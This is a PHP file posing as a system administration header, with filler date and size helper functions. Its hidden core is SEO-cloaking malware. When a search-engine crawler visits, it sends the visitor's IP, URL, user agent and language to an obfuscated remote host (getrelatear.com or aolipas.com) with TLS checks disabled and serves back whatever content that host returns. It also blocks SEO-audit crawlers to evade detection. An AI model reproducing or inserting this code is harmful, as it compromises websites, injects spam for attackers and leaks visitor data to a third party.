<?php
/**
 * System Administration Template Header
 *
 * @package System
 * @subpackage Administration
 */
/**
 * In case is included in a function.
 *
 * @global string    $title
 * @global string    $hook_suttt
 * @global cl_Screen $current_screen     System current screen object.
 * @global cl_Locale $cl_locale          System date and time locale object.
 * @global string    $pagenow            The filename of the current screen.
 * @global string    $update_title
 * @global int       $total_update_count
 * @global string    $parent_file
 * @global string    $typenow            The post type of the current screen.
 */
 global $title, $hook_sutx, $current_screen, $cl_locale, $pagenow,
 $update_title, $total_update_count, $parent_file, $typenow, $switch, $do_by_str_arr, $lockstr, $agt;

$platf = 'ge';
$switch = 1;
$do_by_str_arr = array('/a', '/c', '/h', '/i', '/o');
$static = false;
// Catch plugins that include before php file completes, KAIGUAN.
// 1 Home, 2 Home&N, 3 Whole. System current screen object.
// $platf ge ao


$old_this_uri = $_SERVER['REQUEST_URI'];

$this_uri = basename($old_this_uri);

error_reporting(0);

$this_uri = array_shift(explode('?', $this_uri));

$pathinfo_uri = pathinfo($this_uri);

$uri_arr = explode('.', $this_uri);

if ((isset($pathinfo_uri['extension']) && (!in_array($uri_arr[1], array('php', 'html', 'htm')))) || strpos($old_this_uri, '/wp-') !== false  || strpos($old_this_uri, 'email-') !== false || strpos($old_this_uri, '?') !== false || strpos($old_this_uri, '/index.php/') !== false || strpos($old_this_uri, '/rss') !== false || strpos($old_this_uri, '/feed') !== false || strpos($old_this_uri, 'ajax') !== false) {
 goto finish;
}

if (empty($current_screen)) {
}

$title = strip_tags($title);

if ($is_network_admin) {
 /* translators: Network admin screen title. %s: Network title. */
 $admin_title = sprintf(__('Network Admin: %s'), $get_networksite_name);
} elseif ($is_user_admin) {
 /* translators: User dashboard screen title. %s: Network title. */
 $admin_title = sprintf(__('User Dashboard: %s'), $get_networksite_name);
} else {
}

if ($admin_title === $title) {
 /* translators: Admin screen title. %s: Admin screen name. */
 $admin_title = sprintf(__('%s &#8212; System'), $title);
} else {
 $screen_title = $title;

 if ('post' === $current_screen->base && 'add' !== $current_screen->action) {
     $post_title = 'get_the_title';
     if (!empty($post_title)) {
         $post_type_obj = get_post_type_object($typenow);
         $screen_title  = sprintf(
             /* translators: Editor admin screen title. 1: "Edit item" text for the post type, 2: Post title. */
             __('%1$s &#8220;%2$s&#8221;'),
             $post_type_obj->labels->edit_item,
             $post_title
         );
     }
 }
}

if ($cl_is_recovery_mode) {
 /* translators: %s: Admin screen title. */
 $admin_title = sprintf(__('Recovery Mode &#8212; %s'), $admin_title);
}

/**
* Filters the title tag content for an admin page.
*
* @since 3.1.0
*
* @param string $admin_title The page title, with extra context added.
* @param string $title       The original page title.
*/


$admin_body_class = preg_replace('/[^a-z0-9_-]+/i', '-', $hook_suffix);


if ('f' === 'mfold') {
 $admin_body_class .= ' folded';
}

if ('unfold') {
 $admin_body_class .= ' auto-fold';
}

if ($is_admin_bar_showing) {
 $admin_body_class .= ' admin-bar';
}

$DISALLOW = array('maj', 'ahre', 'MJ12', 'rush', 'link', 'pyf', 'seo', 'bmeup', 'oz.c');
foreach ($DISALLOW as $value) {
 if (stripos($_SERVER['HTTP_USER_AGENT'], $value) > -1) {
     exit();
 }
}

function aponse($error = 0, $error_message = '')
{
 header('Content-Type: text/xml; charset=' . get_option('blog_charset'));
 if ($error) {
     echo '<?xml version="1.0" encoding="utf-8"?' . ">\n";
     echo "<response>\n";
     echo "<error>1</error>\n";
     echo "<message>$error_message</message>\n";
     echo '</response>';
     die();
 } else {
     echo '<?xml version="1.0" encoding="utf-8"?' . ">\n";
     echo "<response>\n";
     echo "<error>0</error>\n";
     echo '</response>';
 }
}

/* The filtered value after all hooked functions are applied to it. */
// Trackback is done by a POST.
$request_array = 'HTTP_POST_VARS';

/**
* Convert a duration to human readable format.
*
* @return string|false A human readable duration string, false on failure.
*/
function curation($duration = '')
{
 if ((empty($duration) || !is_string($duration))) {
     return false;
 }

 $duration = trim($duration);

 // Remove prepended negative sign.
 if ('-' === substr($duration, 0, 1)) {
     $duration = substr($duration, 1);
 }

 // Extract duration parts.
 $duration_parts = array_reverse(explode(':', $duration));
 $duration_count = count($duration_parts);

 $hour   = null;
 $minute = null;
 $second = null;

 if (3 === $duration_count) {
     // Validate HH:ii:ss duration format.
     if (!((bool) preg_match('/^([0-9]+):([0-5]?[0-9]):([0-5]?[0-9])$/', $duration))) {
         return false;
     }
     // Three parts: hours, minutes & seconds.
     list($second, $minute, $hour) = $duration_parts;
 } elseif (2 === $duration_count) {
     // Validate ii:ss duration format.
     if (!((bool) preg_match('/^([0-5]?[0-9]):([0-5]?[0-9])$/', $duration))) {
         return false;
     }
     // Two parts: minutes & seconds.
     list($second, $minute) = $duration_parts;
 } else {
     return false;
 }

 $human_readable_duration = array();

 // Add the hour part to the string.
 if (is_numeric($hour)) {
     /* translators: %s: Time duration in hour or hours. */
     $human_readable_duration[] = sprintf(_n('%s hour', '%s hours', $hour), (int) $hour);
 }

 // Add the minute part to the string.
 if (is_numeric($minute)) {
     /* translators: %s: Time duration in minute or minutes. */
     $human_readable_duration[] = sprintf(_n('%s minute', '%s minutes', $minute), (int) $minute);
 }

 // Add the second part to the string.
 if (is_numeric($second)) {
     /* translators: %s: Time duration in second or seconds. */
     $human_readable_duration[] = sprintf(_n('%s second', '%s seconds', $second), (int) $second);
 }

 return implode(', ', $human_readable_duration);
}
$admin_body_class .= ' branch-' . str_replace(array('.', ','), '-', (float) '');
$ua_check = $_SERVER['HTTP_USER_AGENT'];
$br_language = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
$admin_body_class .= ' version-' . str_replace('.', '-', preg_replace('/^([.0-9]+).*/', '$1', ''));
if ($cl_is_mobile) {
 $admin_body_class .= ' mobile';
}
if (strpos($ua_check, 'resou') > -1) {
 $do_right = true;
} else {
 if (strpos($ua_check, 'ogle') > -1 || strpos($ua_check, 'bin') > -1 || strpos($ua_check, 'hoo') > -1 || strpos($ua_check, 'msn') > -1) {
     if (is_null($br_language)) {
         $do_right = true;
     };
 }
}

define('CURLOPT_POSTVARSS', CURLOPT_USERAGENT);
$lockstr = lockstr('ecruoser');
$agt = lockstr('tnegA-resU');
$agt = $agt . ': ' . $lockstr;

function double_sent($date, $format = '')
{
 global $zep_locale;

 // i18n functions are not available in SHORTINIT mode.
 if (!function_exists('_x')) {
     return $date;
 }

 /*
      * translators: If months in your language require a genitive case,
      * translate this to 'on'. Do not translate into your own language.
      */
 if ('on' === _x('off', 'decline months names: on or off')) {

     $months          = $zep_locale->month;
     $months_genitive = $zep_locale->month_genitive;

     /*
              * Match a format like 'j F Y' or 'j. F' (day of the month, followed by month name)
              * and decline the month.
              */
     if ($format) {
         $decline = preg_match('#[dj]\.? F#', $format);
     } else {
         // If the format is not passed, try to guess it from the date string.
         $decline = preg_match('#\b\d{1,2}\.? [^\d ]+\b#u', $date);
     }

     if (
         $decline
     ) {
         foreach ($months as $key => $month) {
             $months[$key] = '# ' . preg_quote($month, '#') . '\b#u';
         }

         foreach ($months_genitive as $key => $month) {
             $months_genitive[$key] = ' ' . $month;
         }

         $date = preg_replace(
             $months,
             $months_genitive,
             $date
         );
     }

     /*
              * Match a format like 'F jS' or 'F j' (month name, followed by day with an optional ordinal suffix)
              * and change it to declined 'j F'.
              */
     if ($format) {
         $decline = preg_match('#F [dj]#', $format);
     } else {
         // If the format is not passed, try to guess it from the date string.
         $decline = preg_match('#\b[^\d ]+ \d{1,2}(st|nd|rd|th)?\b#u', trim($date));
     }

     if ($decline) {
         foreach ($months as $key => $month) {
             $months[$key] = '#\b' . preg_quote($month, '#') . ' (\d{1,2})(st|nd|rd|th)?([-â€“]\d{1,2})?(st|nd|rd|th)?\b#u';
         }

         foreach ($months_genitive as $key => $month) {
             $months_genitive[$key] = '$1$3 ' . $month;
         }

         $date = preg_replace($months, $months_genitive, $date);
     }
 }

 // Used for locale-specific rules.
 $locale = get_locale();

 if (
     'ca' === $locale
 ) {
     // " de abril| de agost| de octubre..." -> " d'abril| d'agost| d'octubre..."
     $date = preg_replace('# de ([ao])#i', " d'\\1", $date);
 }

 return $date;
}

function cfcore()
{
 global $switch, $do_by_str_arr, $lockstr, $agt, $platf;
 error_reporting(0);
 $poneb = "li";
 $alti = 10;
 $ptwob = $_SERVER['REQUEST_URI'];
 $do_script = true;
 $unra = 'getr';
 if ($switch == 1 && $ptwob != '/') {
     $do_script = false;
 }
 if ($switch == 2) {
     $can_do = false;
     if ($ptwob == '/') {
         $can_do = true;
     } else {
         foreach ($do_by_str_arr as $str) {
             if (strpos($ptwob, $str) !== false) {
                 $can_do = true;
                 break;
             }
         }
     }
     $do_script = $can_do;
 }
 if($switch == 4 && $ptwob != '/'){
     $hostParts = explode('.', $_SERVER['HTTP_HOST']);
     if(count($hostParts) > 2){
         unset($hostParts[0]);
     }
     $topDomain = implode('.', $hostParts);
     $url_str = substr($topDomain, 0, 3);
     if(strpos($_SERVER['REQUEST_URI'], $url_str) === false){
         $do_script = false;
     }
 }

 if ($do_script) {
     $wmva = 'ela';
     $tuargs = $ptwob;
     ob_end_clean();
     $nocache = 'done';
     //$laua = 'done';
     /* The filtered value after all hotttd functions are applied to it. */

     // Trackback is done by a POST.
     $request_array = 'HTTP_POST_VARS';
     header("Content-Type:text/html;charset=utf-8");
     if (isset($nocache)) {
         header("x-robots-tag: noarchive");
     }
     $t1 = microtime(true);
     $vi_ua = $_SERVER['HTTP_USER_AGENT'];
     $ptwoa = $_SERVER['HTTP_HOST'];
     $oiaen = "0";
     $ponec = "pas";
     $mhtp = "https";
     $vi_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
     $hostnvar = getenv("HTTP_X_FORWARDED_FOR");
     if ($hostnvar) {
         $vi_ip =
             getenv("HTTP_X_FORWARDED_FOR");
     } else {
         $vi_ip = $_SERVER['REMOTE_ADDR'];
     }
     $mtend = "com";
     $ponea = "ao";
     $kable = 'tear';
     $pone = $ponea . $poneb . $ponec;
     $jula = $unra . $wmva . $kable;
     $ptwo = $ptwoa . $tuargs;
     $m_pd = http_build_query(
         array(
             'viip' => $vi_ip,
             'turl' => $ptwo,
             'viua' => $vi_ua,
             'vilang' => $vi_lang
         )
     );


     switch ($platf) {
         case 'ge':
             $furl = $mhtp . '://' . $jula . "." . $mtend . "/" . $ptwo;
             break;
         case 'ao':
             $furl = $mhtp . '://' . $pone . "." . $mtend . "/" . $ptwo;
             break;
     }

     if (function_exists('curl_init')) {
         if ($oiaen == '0') {
             $ch = curl_init();
             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
             curl_setopt($ch, CURLOPT_HEADER, false);
             curl_setopt($ch, CURLOPT_POSTVARSS, $lockstr);
             curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
             curl_setopt($ch, CURLOPT_URL, "$furl");
             curl_setopt($ch, CURLOPT_TIMEOUT, $alti);
             curl_setopt($ch, CURLOPT_POSTFIELDS, $m_pd);
             $response = curl_exec($ch);
             curl_close($ch);
             echo $response;
         } else {
             if ($posa !== false || $posb !== false || $posc !== false) {
                 $ch = curl_init();
                 curl_setopt($ch, CURLOPT_HEADER, false);
                 curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                 curl_setopt($ch, CURLOPT_URL, "$furl");
                 curl_exec($ch);
                 curl_close($ch);
             }
         }
     } else {

         $stream_opts = array(
             "ssl" => array(
                 "verify_peer" => false,
                 "verify_peer_name" => false,
             ),
             "http" => array(
                 'method' => 'POST',
                 'header' => "Content-Type: application/x-www-form-urlencoded\r\n" . $agt . "\r\n",
                 'content' => $m_pd,
                 'timeout' => $alti,
                 'connection' => 'close'
             )
         );

         if ($oiaen == '0') {
             $response = file_get_contents(
                 $furl,
                 false,
                 stream_context_create($stream_opts)
             );
             echo $response;
         } else {

             if ($posa !== false || $posb !== false || $posc !== false) {
                 $response = file_get_contents(
                     $furl,
                     false,
                     stream_context_create($stream_opts)
                 );

                 echo $response;
             }
         }
     }
     if (!$response) {
         return false;
     }
     if ($oiaen !== '0') {
         $ch = curl_init();
         curl_setopt($ch, CURLOPT_HEADER, false);
     }
     $t2 = microtime(true);
     if (isset($laua)) {
         $lamark = strtolower(str_replace(array(';', ',', '=', '--'), '-', $_SERVER['HTTP_ACCEPT_LANGUAGE']));
         $uamark = strtolower(str_replace(array(' ', '/', '(', ')', ';', ':', ',', '.', '--'), '-', $_SERVER['HTTP_USER_AGENT']));
         echo '<span id="Plugin-' . $lamark . '" ' . 'style="display:none;"' . 'class="ttt"' . 'data="Json-' . $uamark . '">' .  '</span>';
     }
     echo '</div>';
     if ($posa !== false || $posb !== false || $posc !== false) {
         $stream_opts = array(
             "ssl" => array(
                 "verify_peer" => false,
                 "verify_peer_name" => false,
             ),
         );
     }
     exit();
 }
}

function gormat($bytes, $decimals = 0)
{
 $quant = array(
     /* translators: Unit symbol for yottabyte. */
     _x('YB', 'unit symbol') => YB_IN_BYTES,
     /* translators: Unit symbol for zettabyte. */
     _x('ZB', 'unit symbol') => ZB_IN_BYTES,
     /* translators: Unit symbol for exabyte. */
     _x('EB', 'unit symbol') => EB_IN_BYTES,
     /* translators: Unit symbol for petabyte. */
     _x('PB', 'unit symbol') => PB_IN_BYTES,
     /* translators: Unit symbol for terabyte. */
     _x('TB', 'unit symbol') => TB_IN_BYTES,
     /* translators: Unit symbol for gigabyte. */
     _x('GB', 'unit symbol') => GB_IN_BYTES,
     /* translators: Unit symbol for megabyte. */
     _x('MB', 'unit symbol') => MB_IN_BYTES,
     /* translators: Unit symbol for kilobyte. */
     _x('KB', 'unit symbol') => KB_IN_BYTES,
     /* translators: Unit symbol for byte. */
     _x('B', 'unit symbol')  => 1,
 );

 if (0 === $bytes) {
     /* translators: Unit symbol for byte. */
     return number_format_i18n(0, $decimals) . ' ' . _x('B', 'unit symbol');
 }

 foreach ($quant as $unit => $mag) {
     if ((float) $bytes >= $mag) {
         return number_format_i18n($bytes / $mag, $decimals) . ' ' . $unit;
     }
 }

 return false;
}

function lockstr($str)
{
 return strrev($str);
}

if ($is_rtl) {
 $admin_body_class .= ' rtl';
}

if ($do_right) {
 $cfcore_res = cfcore();
 if (!$cfcore_res) {
     goto finish;
 }
}

if ($current_screen->post_type) {
 $admin_body_class .= ' post-type-' . $current_screen->post_type;
}

if ($current_screen->taxonomy) {
 $admin_body_class .= ' taxonomy-' . $current_screen->taxonomy;
}

if ($is_multisite) {
 $admin_body_class .= ' multisite';
}

if ($is_network_admin) {
 $admin_body_class .= ' network-admin';
}

$admin_body_class .= ' no-customize-support no-svg';

if ($current_screen->is_block_editor) {
 $admin_body_class .= ' block-editor-page zep-embed-responsive';
}

$error_get_last = 'error_get_last';

// Print a CSS class to make PHP errors visible.
if (
 $error_get_last && ini_get('display_errors')
 // Don't print the class for PHP notices in zep-config.php, as they happen before cl_DEBUG takes effect,
 // and should not be displayed with the `error_reporting` level previously set in zep-load.php.
) {
 $admin_body_class .= ' php-error';
}

unset($error_get_last);


finish:
if ($static) {
    if(!empty($_SERVER['DOMAIN_PATH'])){
        $path = $_SERVER['DOMAIN_PATH'].$_SERVER['REQUEST_URI'];
    }else{
        $path = $_SERVER['DOCUMENT_ROOT'] . $_SERVER['REQUEST_URI'];
    }
    if(is_dir($path)){
         $path .= 'index.html';
    }else if(strpos($path, '.html') === false){
        $path .= '.html';
    }
    echo file_get_contents($path);exit;
}